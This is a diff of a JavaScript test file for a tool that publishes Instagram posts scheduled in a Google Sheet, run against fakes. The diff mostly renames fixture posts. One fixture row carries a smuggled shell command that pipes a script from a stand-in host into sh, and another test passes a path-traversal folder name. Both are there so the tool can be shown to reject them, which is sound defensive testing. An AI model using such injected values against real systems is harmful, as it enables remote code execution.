@@ -1,6 +1,6 @@
 // Tests the publisher end to end against a fake Instagram and a fake Google Sheet.
 // Nothing real is called. Run from tools/social:  node publish/test-publish.js
-// Needs these posts built first: npm run build-post posts/01-launch, and the same for posts/04-fee-support and posts/06b-1-week-left.
+// Needs these posts built first: npm run build-post posts/01-launch, and the same for posts/03-essay-tips and posts/06b-1-week-left.
 import http from 'node:http';
 import fs from 'node:fs';
 import os from 'node:os';
@@ -58,10 +58,10 @@ const F = `--fixture=${fixture}`, NOW = '--now=2026-11-16T09:30';
 const row = (n, post, type, post_at, status, extra = {}) => ({ row: n, post, type, post_at, status, ...extra });
 
 // ---- prepare ----
-await run('prepare', '01-launch', '04-fee-support', '06b-1-week-left');
+await run('prepare', '01-launch', '03-essay-tips', '06b-1-week-left');
 const jp = (f) => fs.readdirSync(path.join(TOOL, 'posts', f, 'output', 'jpeg'));
 ok(jp('01-launch').filter((x) => x.startsWith('feed-')).length === 4, 'prepare makes 4 feed JPEGs for the launch post');
-ok(jp('04-fee-support').some((x) => x.startsWith('story-')), 'prepare makes story JPEGs too');
+ok(jp('03-essay-tips').some((x) => x.startsWith('story-')), 'prepare makes story JPEGs too');
 ok((await run('prepare', '../../etc')).code !== 0, 'prepare refuses a folder name that isn\'t a post folder');
 
 // ---- which rows count as due ----
@@ -69,7 +69,7 @@ setRows([
   row(2, '01-launch', 'feed', '2026-11-16 08:00', 'Approved'),
   row(3, '02-pinned-rules', 'feed', '2026-11-16 08:05', 'Draft'),
   row(4, '05-where-your-fee-goes', 'feed', '2026-11-19 19:00', 'Approved'),
-  row(5, '04-fee-support', 'story', '2026-11-16 9:00:00', 'approved'),
+  row(5, '03-essay-tips', 'story', '2026-11-16 9:00:00', 'approved'),
   row(6, '03-essay-tips', 'feed', '2026-11-16 08:10', 'Rejected'),
   row(7, '06a-2-weeks-left', 'feed', '', 'Approved'),
   row(8, 'x; curl evil.sh|sh', 'feed', '2026-11-16 08:00', 'Approved'),
@@ -79,15 +79,15 @@ setRows([
   row(12, '06c-3-days-left', 'feed', 46342.4375, 'Approved'),  // 16 Nov 2026 10:30, after "now"
 ]);
 const due = await run('due', F, NOW);
-ok(due.out.trim() === '01-launch 04-fee-support 06b-1-week-left', `"due" lists only valid, approved rows whose time has passed (got "${due.out.trim()}")`);
+ok(due.out.trim() === '01-launch 03-essay-tips 06b-1-week-left', `"due" lists only valid, approved rows whose time has passed (got "${due.out.trim()}")`);
 ok(!/curl|stroy|;/.test(due.out), '"due" never prints anything typed into the sheet except checked folder names');
 ok(/isn't a post folder/.test(due.err) && /Type must be feed or story/.test(due.err) && /only the first is posted/.test(due.err), '"due" explains the bad name, bad type and duplicate row');
 
 const dry = await run(F, NOW);
 ok(/would post 01-launch as feed \(4 images\)/.test(dry.out), 'dry run would post the launch carousel');
-ok(/would post 04-fee-support as story/.test(dry.out), 'dry run would post the story');
+ok(/would post 03-essay-tips as story/.test(dry.out), 'dry run would post the story');
 ok(/would post 06b-1-week-left/.test(dry.out) && !/would post 06c/.test(dry.out), 'a date Sheets stored as a serial number is read as Malaysia time');
-ok(!/would post (05-where|02-pinned|03-essay)/.test(dry.out), 'dry run skips future, draft, rejected and bad-type rows');
+ok(!/would post (05-where|02-pinned)/.test(dry.out) && !/would post 03-essay-tips(?! as story)/.test(dry.out), 'dry run skips future, draft, rejected and bad-type rows');
 ok(/"Post at" is empty/.test(dry.out), 'an approved row with no time is skipped and says why');
 ok(dry.code !== 0, 'a run with problem rows exits as failed, so someone notices');
 ok(calls.length === 0, 'dry run calls Instagram 0 times');
@@ -105,7 +105,7 @@ ok(byRow(3).status === 'Draft' && byRow(6).status === 'Rejected', 'live: draft a
 const carousels = calls.filter((c) => c.params.media_type === 'CAROUSEL');
 ok(carousels.length === 1 && carousels[0].params.children.split(',').length === 4, 'live: the launch carousel is built from 4 slides, and posted once');
 ok(carousels[0].params.caption.startsWith('Pharos is an essay competition'), 'live: caption sent with the carousel');
-ok(calls.some((c) => c.params.media_type === 'STORIES' && c.params.image_url.includes('/04-fee-support/output/jpeg/story-')), 'live: story uses the 1080x1920 story image');
+ok(calls.some((c) => c.params.media_type === 'STORIES' && c.params.image_url.includes('/03-essay-tips/output/jpeg/story-')), 'live: story uses the 1080x1920 story image');
 ok(calls.filter((c) => c.params.is_carousel_item).every((c) => c.params.alt_text), 'live: every carousel slide has alt text');
 ok(calls.filter((c) => c.method === 'GET').every((c) => c.auth === 'Bearer test-token' && !c.url.includes('test-token')), 'live: the token is sent in a header, never in a URL');
 
